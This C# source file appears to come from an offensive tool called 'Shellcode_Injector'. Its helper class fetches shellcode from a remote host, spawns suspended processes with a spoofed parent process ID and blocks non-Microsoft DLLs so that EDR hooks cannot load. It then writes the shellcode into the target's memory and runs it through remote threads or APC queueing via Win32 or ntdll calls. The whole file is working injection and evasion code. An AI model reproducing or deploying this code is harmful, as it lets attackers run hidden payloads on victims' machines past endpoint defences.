using System;
using System.ComponentModel;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using static Shellcode_Injector.WinApi;


namespace Shellcode_Injector
{
    internal class Helpers
    {
        //Read from local file
        public static byte[] ReadLocal(string path)
        {
            try
            {
                byte[] sc = File.ReadAllBytes(path);
                return sc;
            }
            catch (Exception ex)
            {
                throw new Win32Exception(ex.Message);
            }
        }
        //Fetch the file from remote host
        public static byte[] Fetch(string host, string file)
        {
            try
            {
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
                Console.WriteLine($"Fetching {file} from {host}");
                WebClient client = new WebClient();
                client.BaseAddress = host;
                byte[] sc = client.DownloadData(file);
                return sc;
            }
            catch (WebException ex)
            {
                Console.WriteLine("An error occurred while making the HTTP request:");
                throw new Win32Exception(ex.Message);
            }
            catch (ArgumentException ex)
            {
                throw new Win32Exception("Provide the host with a valid scheme: http/https");
            }
        }

        //Set proc attributes
        public static WinApi.SINEX SetAtt(bool spoof_ppid, bool block_dlls, uint ppid) 
        {
            int pcount = (spoof_ppid ? 1 : 0) + (block_dlls ? 1 : 0);

            var sin = new WinApi.SINEX();
            sin.StartupInfo = new WinApi.SIN();
            sin.StartupInfo.cb = (int)Marshal.SizeOf(typeof(WinApi.SINEX));
            
            // Initialize the attribute list
            sin.lpAttributeList = IntPtr.Zero;
            IntPtr psize = IntPtr.Zero;
            
            //InitializeProcThreadAttributeList
            WinApi.InitAtt(IntPtr.Zero, pcount, 0, ref psize);
            
            //Allocating memory for the attributes
            sin.lpAttributeList = Marshal.AllocHGlobal(psize);
            WinApi.InitAtt(sin.lpAttributeList, pcount, 0, ref psize);

            if (spoof_ppid) 
            {
                //Set the parent process attribute
                (IntPtr ppcs, IntPtr pthr) = GetHand(ppid);
                IntPtr pValue = Marshal.AllocHGlobal(sizeof(long));
                Marshal.WriteInt64(pValue, (long)ppcs);

                //PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
                const int PTAPP = 0x00020000;

                bool sccs = WinApi.UpdateAtt(
                    sin.lpAttributeList,
                    0,
                    new IntPtr(PTAPP),
                    pValue,
                    (IntPtr)IntPtr.Size,
                    IntPtr.Zero,
                    IntPtr.Zero);

                if (!sccs)
                {
                    Console.WriteLine("Error updating ppid attr");
                    throw new Win32Exception(Marshal.GetLastWin32Error());
                }
                Marshal.FreeHGlobal(pValue);
            }

            if (block_dlls) 
            {
                //PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY
                const int PTAMP = 0x20007;

                IntPtr pValue = Marshal.AllocHGlobal(sizeof(long));
                Marshal.WriteInt64(pValue, (long)WinApi.MitigationOptions.PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON);

                bool sccs = WinApi.UpdateAtt(
                    sin.lpAttributeList,
                    0,
                    new IntPtr(PTAMP),
                    pValue,
                    (IntPtr)IntPtr.Size,
                    IntPtr.Zero,
                    IntPtr.Zero);

                if (!sccs)
                {
                    Console.WriteLine("Error updating mitigation policy attr");
                    throw new Win32Exception(Marshal.GetLastWin32Error());
                }
                Marshal.FreeHGlobal(pValue);
            }
            return sin;
        }

        //Create proc and return the process information struct,
        //its possible to spoof the ppid with an arbirary one
        //or block the loading of non microsoft signed DLLs in order to avoid EDR dlls to be injected.
        public static WinApi.PIN StartS(WinApi.SINEX sin, string cmd, string cwd)
        {
            var pattr = new WinApi.SATTR();
            var tattr = new WinApi.SATTR();
            var pin = new WinApi.PIN();

            pattr.nLength = Marshal.SizeOf(pattr);
            tattr.nLength = Marshal.SizeOf(tattr);

            //Create a suspended process with extended startup info
            bool ok = WinApi.Starter(
                    cmd,
                    null,
                    ref pattr,
                    ref tattr,
                    false,
                    (uint)WinApi.proc.sspnd | (uint)WinApi.proc.extinf,
                    IntPtr.Zero,
                    cwd,
                    ref sin,
                    out pin
                );
            if (!ok)
            {
                Console.WriteLine("Error starting proc");
                throw new Win32Exception(Marshal.GetLastWin32Error());
            }
            else
            {
                Console.WriteLine($"Proc created with PID {pin.dwProcessId}");
                WinApi.DelAtt(sin.lpAttributeList);
                return pin;
            }
        }

        //Allocate memory and write the shellcode - for CreateRemoteThread or QueueUserAPC
        public static IntPtr MWrite(IntPtr phand, byte[] sc) 
        {
            Console.WriteLine("Allocating space trough virtual alloc");
            IntPtr our_place = WinApi.Allocate(
                phand, 
                IntPtr.Zero, 
                (uint)sc.Length, 
                (uint)WinApi.mem.cmt_rv, 
                (uint)WinApi.mem.rw);

            WinApi.WriteMem(phand, our_place, sc, (uint)sc.Length, out _);
            WinApi.Protect(phand, our_place, (int)sc.Length, (uint)WinApi.mem.rx, out _);
            return our_place;
        }

        //Allocate memory and write the shellcode trough ntdll.dll functions
        // To be used with NtCreateThreadEx or NtQueueApcThread
        public static IntPtr NTMWrite(IntPtr phand, byte[] sc) 
        {
            Console.WriteLine("Allocating space trough nt section");
            var hsec = IntPtr.Zero;
            var sc_size = (ulong)sc.Length;
            //Create new memory block section in the current process
            int status = WinApi.cSection(
                ref hsec,
                (ulong)WinApi.gen.sec_accs,
                IntPtr.Zero,
                ref sc_size,
                (uint)WinApi.mem.rwx,
                (ulong)WinApi.gen.sec_cmt,
                IntPtr.Zero
                );

            //Map the view of the created section into the memory of the current process
            status = WinApi.mvSection(
                hsec,
                (IntPtr)(-1),   // Will target current Process
                out var laddr,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                out var _,
                2,             // ViewUnmap (created view will not be inherited by child processes)
                0,
                (uint)WinApi.mem.rw
                );

            //Copy the shellcode
            Marshal.Copy(sc, 0, laddr, sc.Length);

            //Map the created region as RX into the remote process
            status = WinApi.mvSection(
                hsec,
                phand,
                out var raddr,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                out _,
                2,
                0,
                (uint)WinApi.mem.rx
                );

            return raddr;
        }

        //Run the shellcode - techniques (CreateRemoteThread, QueueUserAPC), process info, memory pointer
        public static void SCRun(string tchq, WinApi.PIN proc, IntPtr mem) //TODO pass in the process info struct
        {
            if (tchq == "crt")
            {
                Console.WriteLine("Executing the code trough creating remote thread");
                IntPtr rmth = WinApi.RemoteThread(proc.hProcess, IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
                WinApi.Waiter(rmth, (uint)WinApi.mem.end);
            } else if (tchq == "qua") 
            {
                Console.WriteLine("Executing the code trough queue user apc");
                WinApi.APC(mem, proc.hThread, 0);
                WinApi.Alert(proc.hThread);
                WinApi.Resume(proc.hThread);
            }
        }

        //Run the shellcode trough ntdll.dll - techniques (NtCreateThreadEx, NtQueueApcThread)
        public static void NTSCRun(string tchq, WinApi.PIN proc, IntPtr mem) 
        {
            if (tchq == "ncte")
            {
                Console.WriteLine("Executing the code trough nt create thread");
                WinApi.cThread(
                    out _,
                    (ulong)WinApi.gen.thr_accs,
                    IntPtr.Zero,
                    proc.hProcess,
                    mem,
                    IntPtr.Zero,
                    false,
                    0,
                    0,
                    0,
                    IntPtr.Zero
                    );
            } else if (tchq == "nqat") 
            {
                Console.WriteLine("Executing the code trough nt queue APC thread");
                ntstat status = WinApi.NAPC(proc.hThread, mem, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                status = WinApi.Alert(proc.hThread);
                WinApi.Resume(proc.hThread);
            }
        }

        //Get handle for the remote process
        public static (IntPtr, IntPtr) GetHand(uint id) 
        {
            Console.WriteLine($"Opening handle for process: {id}");
            WinApi.ClntId cid = new WinApi.ClntId();
            cid.UnqProc = (IntPtr)id;
            cid.UnqThr = (IntPtr)0;

            WinApi.ObjAttr oa = new WinApi.ObjAttr(0, IntPtr.Zero, IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero);
            oa.Length = Marshal.SizeOf(oa);
            IntPtr phand = IntPtr.Zero;
            IntPtr thand = IntPtr.Zero;

            //Open a handle to the target process
            WinApi.OpenP(ref phand, WinApi.all_accs, ref oa, ref cid);

            //Open a handle to a thread
            //int status = WinApi.OpenT(ref thand, 0x1FFFFF, ref oa, ref cid);
            //Console.WriteLine($"Open thread status: {status.ToString("X")}");

            return (phand, thand);
        }
    }
}
